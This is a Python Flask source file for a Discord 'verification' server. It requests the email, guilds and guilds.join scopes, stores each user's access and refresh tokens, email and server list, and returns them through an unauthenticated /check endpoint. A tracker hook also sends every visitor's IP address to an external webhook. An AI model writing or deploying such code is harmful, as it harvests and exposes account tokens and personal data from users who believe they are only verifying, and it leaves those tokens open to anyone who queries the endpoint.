import os
import secrets
import datetime
from urllib.parse import urlencode

import requests
from flask import Flask, request, jsonify

app = Flask(__name__)

# ============================================================
# KONFIGURATION (.env / Render Env-Variablen)
# ============================================================
CLIENT_ID        = os.environ.get("CLIENT_ID", "")
CLIENT_SECRET    = os.environ.get("CLIENT_SECRET", "")
PUBLIC_URL       = os.environ.get("PUBLIC_URL", "http://localhost:5000")
GUILD_ID         = os.environ.get("GUILD_ID", "")
SITE_LOG_KEY     = os.environ.get("SITE_LOG_KEY", "")
SITE_WEBHOOK_URL = os.environ.get("SITE_WEBHOOK_URL", "")

DISCORD_API  = "https://discord.com/api"
REDIRECT_URI = f"{PUBLIC_URL}/callback"

# state -> Ergebnis (wird vom Bot per /check abgeholt und gelöscht)
results = {}

print("=== Verify-Server gestartet ===")
print(f"CLIENT_ID        gesetzt: {bool(CLIENT_ID)}")
print(f"CLIENT_SECRET    gesetzt: {bool(CLIENT_SECRET)}")
print(f"PUBLIC_URL       = {PUBLIC_URL}")
print(f"REDIRECT_URI     = {REDIRECT_URI}")
print(f"GUILD_ID         gesetzt: {bool(GUILD_ID)}")
print(f"SITE_LOG_KEY     gesetzt: {bool(SITE_LOG_KEY)}")
print(f"SITE_WEBHOOK_URL gesetzt: {bool(SITE_WEBHOOK_URL)}")


def exchange_code(code):
    """Tauscht den OAuth2-Code gegen Tokens + User-Daten."""
    r = requests.post(
        f"{DISCORD_API}/oauth2/token",
        data={
            "client_id": CLIENT_ID,
            "client_secret": CLIENT_SECRET,
            "grant_type": "authorization_code",
            "code": code,
            "redirect_uri": REDIRECT_URI,
        },
        timeout=10,
    )
    if r.status_code != 200:
        return None, None, None, None, None, None, f"Token-Fehler: {r.status_code} {r.text[:200]}"

    token = r.json()
    access_token = token.get("access_token")
    refresh_token = token.get("refresh_token", "")
    headers = {"Authorization": f"Bearer {access_token}"}

    me = None
    guilds = []
    r2 = requests.get(f"{DISCORD_API}/users/@me", headers=headers, timeout=10)
    if r2.status_code == 200:
        me = r2.json()
    r3 = requests.get(f"{DISCORD_API}/users/@me/guilds", headers=headers, timeout=10)
    if r3.status_code == 200:
        guilds = r3.json()

    email = (me or {}).get("email", "")
    user_id = (me or {}).get("id", "")
    return access_token, refresh_token, user_id, email, me, guilds, None


# ============================================================
# TRACKER-SNIPPET (loggt Seitenaufrufe an den Webhook)
# ============================================================
@app.after_request
def log_to_site_webhook(response):
    """Loggt Requests ans Webhook-Panel – aber NICHT das /check-Polling (sonst Spam)."""
    if not SITE_WEBHOOK_URL:
        return response
    # /check wird vom Bot alle 5 Sek. gepollt → nicht loggen
    if request.path == "/check":
        return response
    try:
        ip = request.headers.get("X-Forwarded-For", request.remote_addr or "?").split(",")[0].strip()
        payload = {
            "content": None,
            "embeds": [{
                "title": "🌐 Seitenaufruf",
                "color": 0x3498DB,
                "description": (
                    f"**Route:** `{request.path}`\n"
                    f"**Methode:** `{request.method}`\n"
                    f"**IP:** `{ip}`\n"
                    f"**Status:** `{response.status_code}`\n"
                    f"**Zeit:** `{datetime.datetime.now().strftime('%d.%m.%Y %H:%M:%S')}`"
                ),
                "footer": {"text": "Verify-Server Tracker"}
            }]
        }
        requests.post(SITE_WEBHOOK_URL, json=payload, timeout=5)
    except Exception:
        pass
    return response


# ============================================================
# ROUTEN
# ============================================================
@app.route("/")
def index():
    return "<h2>Verify-Server läuft ✅</h2>"


@app.route("/start")
def start():
    """Leitet zur Discord-OAuth-Seite weiter."""
    state = secrets.token_urlsafe(16)
    params = {
        "client_id": CLIENT_ID,
        "redirect_uri": REDIRECT_URI,
        "response_type": "code",
        "scope": "identify email guilds guilds.join",
    }
    url = f"https://discord.com/oauth2/authorize?{urlencode(params)}&state={state}"
    return f'<a href="{url}">Weiter zur Discord-Verifizierung</a>'


@app.route("/callback")
def callback():
    """OAuth-Callback: tauscht Code, speichert Ergebnis unter dem state."""
    code = request.args.get("code")
    state = request.args.get("state", "")
    error = request.args.get("error")
    if error or not code:
        if state:
            results[state] = {"status": "error", "reason": error or "Kein Code erhalten"}
        return "<h2>❌ Verifizierung abgebrochen oder fehlgeschlagen.</h2><p>Bitte versuche es erneut.</p>", 400

    access_token, refresh_token, user_id, email, me, guilds, err = exchange_code(code)
    if err:
        if state:
            results[state] = {"status": "error", "reason": err}
        return f"<h2>❌ {err}</h2>", 500

    # Ergebnis unter dem state ablegen (genau diesen state pollt der Bot)
    results[state] = {
        "status": "success",
        "user_id": user_id,
        "access_token": access_token,
        "refresh_token": refresh_token,
        "email": email,
        "username": (me or {}).get("username", "?"),
        "display_name": (me or {}).get("global_name") or (me or {}).get("username", "?"),
        "avatar": (me or {}).get("avatar", ""),
        "guilds": guilds,
        "verified_at": datetime.datetime.now(datetime.timezone.utc).isoformat(),
    }

    name = (me or {}).get("global_name") or (me or {}).get("username", "?")
    return f"<h2>✅ Verifiziert! Willkommen, {name}!</h2><p>Du kannst dieses Fenster schließen.</p>"


@app.route("/check")
def check():
    """Vom Bot gepollt: liefert das Ergebnis für einen state (pending = noch nicht fertig)."""
    state = request.args.get("state", "")
    data = results.pop(state, None)
    if data is None:
        return jsonify({"status": "pending"})
    return jsonify(data)


if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port, debug=False)
